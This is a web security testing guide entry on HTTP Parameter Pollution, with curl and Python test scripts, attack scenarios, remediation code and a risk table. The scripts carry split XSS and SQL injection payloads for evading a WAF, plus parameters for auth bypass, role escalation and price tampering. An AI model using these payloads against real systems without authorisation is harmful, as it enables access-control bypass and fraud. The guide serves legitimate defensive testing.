# WSTG-INPV-04: Testing for HTTP Parameter Pollution (HPP)

## Test ID
WSTG-INPV-04

## Test Name
Testing for HTTP Parameter Pollution (HPP)

## High-Level Description

HTTP Parameter Pollution (HPP) occurs when an application doesn't properly handle multiple parameters with the same name. Different web servers and frameworks handle duplicate parameters differently, which can lead to bypassing input validation, WAF evasion, or logic manipulation.

---

## What to Check

- [ ] Duplicate parameter handling
- [ ] Server-side parameter pollution
- [ ] Client-side parameter pollution
- [ ] WAF bypass via parameter pollution
- [ ] Business logic bypass
- [ ] Parameter precedence

---

## How to Test

### Step 1: Test Parameter Handling

```bash
#!/bin/bash
TARGET="https://target.com"

# Test duplicate parameters
echo "[*] Testing duplicate parameter handling..."

# Same parameter multiple times in query string
curl -s "$TARGET/search?q=test1&q=test2" | head -20

# Parameter in both query string and body
curl -s -X POST "$TARGET/search?q=query_value" -d "q=body_value" | head -20

# URL encoded duplicates
curl -s "$TARGET/search?q=test1&q=test2&q=test3"

# Different encodings
curl -s "$TARGET/search?q=test&%71=polluted"  # %71 = q
```

### Step 2: HPP Vulnerability Tester

```python
#!/usr/bin/env python3
"""
HTTP Parameter Pollution Tester
"""

import requests
from urllib.parse import urlencode, quote

class HPPTester:
    def __init__(self, base_url):
        self.base_url = base_url
        self.findings = []
        self.session = requests.Session()

    # Server behavior reference
    SERVER_BEHAVIORS = {
        'ASP.NET': 'Concatenates with comma (value1,value2)',
        'PHP': 'Last parameter wins',
        'JSP': 'First parameter wins',
        'Python/Flask': 'First parameter wins',
        'Python/Django': 'Last parameter wins (getlist returns all)',
        'Ruby/Rails': 'Last parameter wins',
        'Node.js/Express': 'Array of values',
    }

    def test_duplicate_params(self, endpoint, param_name):
        """Test how server handles duplicate parameters"""
        print(f"\n[*] Testing duplicate parameters: {param_name}")

        url = f"{self.base_url}{endpoint}"

        # Test 1: Multiple values in query string
        test_url = f"{url}?{param_name}=value1&{param_name}=value2&{param_name}=value3"
        response = self.session.get(test_url)

        print(f"  URL: ?{param_name}=value1&{param_name}=value2&{param_name}=value3")
        print(f"  Status: {response.status_code}")

        # Analyze which value is reflected
        if 'value1' in response.text and 'value2' not in response.text:
            print(f"  [INFO] Server uses FIRST parameter (JSP/Flask style)")
            return 'first'
        elif 'value2' in response.text or 'value3' in response.text:
            if 'value1' not in response.text:
                print(f"  [INFO] Server uses LAST parameter (PHP/Django style)")
                return 'last'
        elif 'value1,value2' in response.text or 'value1, value2' in response.text:
            print(f"  [INFO] Server concatenates parameters (ASP.NET style)")
            return 'concat'
        elif 'value1' in response.text and 'value2' in response.text:
            print(f"  [INFO] Server uses ALL parameters")
            return 'all'

        return 'unknown'

    def test_auth_bypass(self, endpoint):
        """Test authentication/authorization bypass via HPP"""
        print(f"\n[*] Testing auth bypass via HPP...")

        # Scenario: admin=false in original, try to inject admin=true
        test_cases = [
            # Inject before existing parameter
            f"{endpoint}?admin=true&admin=false",
            # Inject after existing parameter
            f"{endpoint}?admin=false&admin=true",
            # Different encoding
            f"{endpoint}?admin=false&%61dmin=true",  # %61 = a
            # Array notation
            f"{endpoint}?admin[]=false&admin[]=true",
            # Mixed case
            f"{endpoint}?admin=false&Admin=true",
        ]

        for test_url in test_cases:
            url = f"{self.base_url}{test_url}"
            response = self.session.get(url)

            if response.status_code == 200:
                # Check for privilege escalation indicators
                if 'admin' in response.text.lower() or 'dashboard' in response.text.lower():
                    print(f"  [WARN] Potential bypass: {test_url}")
                    self.findings.append({
                        'type': 'HPP Auth Bypass Attempt',
                        'url': test_url,
                        'severity': 'High',
                        'note': 'Manual verification required'
                    })

    def test_waf_bypass(self, endpoint, param_name):
        """Test WAF bypass via parameter pollution"""
        print(f"\n[*] Testing WAF bypass via HPP...")

        # Split malicious payload across parameters
        payloads = [
            # Split XSS payload
            (f"?{param_name}=<script>&{param_name}=alert(1)</script>", "XSS split"),
            # Split SQL injection
            (f"?{param_name}=1' OR &{param_name}='1'='1", "SQLi split"),
            # URL encoded split
            (f"?{param_name}=%3Cscript%3E&{param_name}=alert(1)%3C/script%3E", "XSS encoded split"),
        ]

        for payload, description in payloads:
            url = f"{self.base_url}{endpoint}{payload}"
            response = self.session.get(url)

            # Check if WAF blocked (typically 403 or custom error)
            if response.status_code == 200:
                print(f"  [INFO] {description} - Not blocked ({response.status_code})")
                self.findings.append({
                    'type': 'Potential WAF Bypass',
                    'payload': payload,
                    'description': description,
                    'severity': 'Medium'
                })
            else:
                print(f"  [OK] {description} - Blocked ({response.status_code})")

    def test_business_logic(self, endpoint):
        """Test business logic bypass via HPP"""
        print(f"\n[*] Testing business logic bypass...")

        # Common business parameters
        business_params = [
            ('price', '100', '1'),         # Price manipulation
            ('quantity', '1', '999'),      # Quantity manipulation
            ('discount', '0', '99'),       # Discount manipulation
            ('user_id', '123', '1'),       # IDOR attempt
            ('role', 'user', 'admin'),     # Role escalation
            ('verified', 'false', 'true'), # Status bypass
        ]

        for param, normal_val, malicious_val in business_params:
            # Test first wins
            url1 = f"{self.base_url}{endpoint}?{param}={malicious_val}&{param}={normal_val}"
            # Test last wins
            url2 = f"{self.base_url}{endpoint}?{param}={normal_val}&{param}={malicious_val}"

            for url in [url1, url2]:
                try:
                    response = self.session.get(url)
                    if response.status_code == 200:
                        print(f"  [INFO] Testing {param}: {response.status_code}")
                except:
                    pass

    def test_client_side_hpp(self, endpoint):
        """Test client-side HPP via URL fragments and JavaScript"""
        print(f"\n[*] Testing client-side HPP scenarios...")

        # Client-side HPP occurs when:
        # 1. JavaScript reads parameters from URL
        # 2. Parameters are used to build URLs or make requests

        payloads = [
            # Injecting into URL building
            f"{endpoint}?url=https://safe.com&url=https://evil.com",
            # Callback parameter pollution
            f"{endpoint}?callback=safe&callback=evil",
            # Redirect parameter pollution
            f"{endpoint}?redirect=/home&redirect=//evil.com",
        ]

        for payload in payloads:
            url = f"{self.base_url}{payload}"
            response = self.session.get(url)
            print(f"  Testing: {payload}")

    def test_encoding_variations(self, endpoint, param_name):
        """Test different encoding variations for HPP"""
        print(f"\n[*] Testing encoding variations...")

        # Different ways to represent the same parameter
        variations = [
            (f"{param_name}", "Normal"),
            (f"{quote(param_name)}", "URL encoded"),
            (f"{param_name.upper()}", "Uppercase"),
            (f"{param_name.lower()}", "Lowercase"),
            (f" {param_name}", "Leading space"),
            (f"{param_name} ", "Trailing space"),
            (f"{param_name}[]", "Array notation"),
            (f"{param_name}[0]", "Array index"),
        ]

        base_url = f"{self.base_url}{endpoint}"

        for variant, description in variations:
            url = f"{base_url}?{param_name}=original&{variant}=polluted"
            response = self.session.get(url)
            print(f"  {description}: {response.status_code}")

    def generate_report(self):
        """Generate findings report"""
        print("\n" + "="*60)
        print("HTTP PARAMETER POLLUTION REPORT")
        print("="*60)

        print("\nServer Behavior Reference:")
        for server, behavior in self.SERVER_BEHAVIORS.items():
            print(f"  {server}: {behavior}")

        if self.findings:
            print(f"\nFound {len(self.findings)} potential issues:\n")
            for f in self.findings:
                print(f"[{f['severity']}] {f['type']}")
                if 'url' in f:
                    print(f"  URL: {f['url']}")
                if 'payload' in f:
                    print(f"  Payload: {f['payload']}")
                if 'note' in f:
                    print(f"  Note: {f['note']}")
                print()

    def run_tests(self, endpoint='/search', param='q'):
        """Run all HPP tests"""
        self.test_duplicate_params(endpoint, param)
        self.test_auth_bypass(endpoint)
        self.test_waf_bypass(endpoint, param)
        self.test_business_logic('/checkout')
        self.test_client_side_hpp(endpoint)
        self.test_encoding_variations(endpoint, param)
        self.generate_report()

# Usage
tester = HPPTester("https://target.com")
tester.run_tests()
```

### Step 3: Server-Specific Tests

```bash
#!/bin/bash
# Test parameter handling by server type

TARGET="https://target.com/page"

echo "=== HPP Server Behavior Tests ==="

# Test 1: Basic duplicate parameters
echo -e "\n[Test 1] Basic duplicate: ?id=1&id=2"
curl -s "$TARGET?id=1&id=2" | grep -oP 'id["\s:=]+\K[^"&\s,<]+' | head -5

# Test 2: URL encoded duplicate
echo -e "\n[Test 2] URL encoded: ?id=1&%69%64=2"
curl -s "$TARGET?id=1&%69%64=2" | grep -oP 'id["\s:=]+\K[^"&\s,<]+' | head -5

# Test 3: Array notation (PHP)
echo -e "\n[Test 3] Array notation: ?id[]=1&id[]=2"
curl -s "$TARGET?id[]=1&id[]=2" | grep -oP 'id["\s:=]+\K[^"&\s,<]+' | head -5

# Test 4: POST body vs query string
echo -e "\n[Test 4] Query vs Body: ?id=query with POST id=body"
curl -s -X POST "$TARGET?id=query" -d "id=body" | grep -oP 'id["\s:=]+\K[^"&\s,<]+' | head -5

# Test 5: JSON body pollution
echo -e "\n[Test 5] JSON with duplicate keys"
curl -s -X POST "$TARGET" \
    -H "Content-Type: application/json" \
    -d '{"id":"1","id":"2"}' | head -20
```

### Step 4: HPP Attack Scenarios

```python
# Scenario 1: Vote manipulation
# Original: /vote?poll_id=1&choice=A
# Attack: /vote?poll_id=1&choice=A&choice=B&choice=C
# If server processes all choices, attacker votes multiple times

# Scenario 2: Price manipulation
# Original: /checkout?item=123&price=100
# Attack: /checkout?item=123&price=100&price=1
# If server uses last price value, attacker pays less

# Scenario 3: Access control bypass
# Original: /api/user?id=123&role=user
# Attack: /api/user?id=123&role=user&role=admin
# If server uses last role value, attacker escalates privileges

# Scenario 4: WAF evasion
# WAF blocks: <script>alert(1)</script>
# Attack: /page?input=<script>&input=alert(1)</script>
# Server concatenates: <script>alert(1)</script> (bypasses WAF)
```

---

## Tools

| Tool | Purpose |
|------|---------|
| Burp Suite | Parameter manipulation |
| ParamMiner | Parameter discovery |
| Arjun | Hidden parameter finder |
| curl | Manual testing |

---

## Remediation

```python
# Python/Flask - Handle duplicate parameters explicitly
from flask import Flask, request

app = Flask(__name__)

@app.route('/api/action')
def handle_action():
    # Get only the first value
    param = request.args.get('param')  # First value only

    # Or explicitly handle multiple values
    all_values = request.args.getlist('param')
    if len(all_values) > 1:
        # Log potential HPP attempt
        app.logger.warning(f"Multiple values for param: {all_values}")
        # Use only the first or reject
        return "Invalid request", 400

    return process_param(param)
```

```php
<?php
// PHP - Explicitly handle parameters
// By default, PHP uses the last value

// Get all values
$values = $_GET;

// Check for array parameters
if (is_array($_GET['param'])) {
    // Handle array or reject
    error_log("HPP attempt detected");
    http_response_code(400);
    exit("Invalid request");
}

// Use the expected single value
$param = $_GET['param'];
?>
```

```javascript
// Node.js/Express - Handle duplicates
app.get('/api/action', (req, res) => {
    const param = req.query.param;

    // Express returns array for duplicates
    if (Array.isArray(param)) {
        console.warn('HPP attempt:', param);
        return res.status(400).send('Invalid request');
    }

    // Process single value
    processParam(param);
});
```

---

## Risk Assessment

| Finding | CVSS | Severity |
|---------|------|----------|
| HPP leading to auth bypass | 8.1 | High |
| HPP price/quantity manipulation | 7.5 | High |
| HPP WAF bypass | 6.5 | Medium |
| HPP logic manipulation | 5.5 | Medium |

---

## CWE Categories

| CWE ID | Title |
|--------|-------|
| **CWE-235** | Improper Handling of Extra Parameters |

---

## References

- [OWASP HTTP Parameter Pollution](https://owasp.org/www-project-web-security-testing-guide/)
- [HPP Research Paper](https://www.madlab.it/slides/BHEU2011/whitepaper-bhEU2011.pdf)
- [Web Parameter Tampering](https://owasp.org/www-community/attacks/Web_Parameter_Tampering)

---

## Checklist

```
[ ] Duplicate parameter behavior tested
[ ] Server parameter precedence identified
[ ] Authentication bypass tested
[ ] Authorization bypass tested
[ ] WAF bypass tested
[ ] Business logic impact tested
[ ] Encoding variations tested
[ ] Findings documented
```
